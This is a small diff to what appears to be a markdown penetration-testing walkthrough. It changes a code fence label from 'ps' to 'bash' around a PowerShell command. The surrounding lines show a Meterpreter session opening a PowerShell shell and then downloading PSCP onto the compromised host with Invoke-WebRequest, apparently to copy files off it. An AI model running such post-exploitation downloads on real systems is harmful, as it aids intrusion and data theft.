@@ -460,7 +460,7 @@ meterpreter > powershell_shell
 
 Then start to download `PSCP` using the following command:
 
-```ps
+```bash
 Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
 ```
 
